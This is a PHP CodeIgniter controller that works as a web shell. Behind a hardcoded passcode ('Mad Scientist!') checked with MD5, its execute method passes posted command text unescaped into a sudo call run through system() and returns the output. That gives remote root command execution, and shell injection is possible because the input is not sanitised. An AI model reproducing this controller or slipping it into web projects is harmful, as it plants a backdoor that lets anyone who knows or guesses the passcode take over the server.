<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Futuregadget extends CI_Controller {

	private function _redirect_page($method, $params = array()){
		if (method_exists($this, $method))
			return call_user_func_array(array($this, $method), $params);
		else
			show_404();
	}

	public function _remap($method, $params = array()){
		$PASSCODE = "Mad Scientist!";
		
		if ($method == 'authentication') $this->_redirect_page($method, $params);
		else {
			if ($this->session->userdata('PASSCODE') == md5($PASSCODE))
				$this->_redirect_page($method, $params);
			else {
				
			}
		}
	}
	
	function passcode_check($__passcode){
		$PASSCODE = "Mad Scientist!";
		return md5($__passcode) == md5($PASSCODE);
	}
	
	public function authentication() {
		$this->load->library('form_validation');
			
		$this->form_validation->set_rules('passcode', 'Passcode', 'required|passcode_check');

		if ($this->form_validation->run() == FALSE){
			$this->load->view('futuregadget/authentication');
		}else{
			//$this->load->model('user');
			$this->session->set_userdata('PASSCODE', md5($this->input->post('passcode')));
			
			$this->load->view('success');
		}
	}
	
	public function shell() {
		$this->load->view('futuregadget/shell');
	}
	
	public function execute() {
		$cmd = "/home/bash.sh 'sudo " . $this->input->post('cmd') . "'";
		$result = system($cmd);
		
		$this->load->view('information', array('data' => $result));
	}
}